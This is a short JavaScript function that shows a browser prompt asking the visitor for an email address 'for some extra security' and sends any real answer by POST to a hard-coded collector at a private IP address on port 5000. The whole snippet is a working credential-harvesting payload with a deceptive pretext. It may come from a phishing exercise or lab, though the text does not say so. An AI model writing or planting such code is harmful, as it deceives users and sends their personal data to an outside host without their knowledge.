function showPopup() {
    var input = window.prompt('Please enter your email. (This is for some extra security)', 'example@gmail.com');

    if (input != 'example@gmail.com' && input.includes('@')) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", 'http://10.200.34.179:5000/', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({input: input}));
    }
};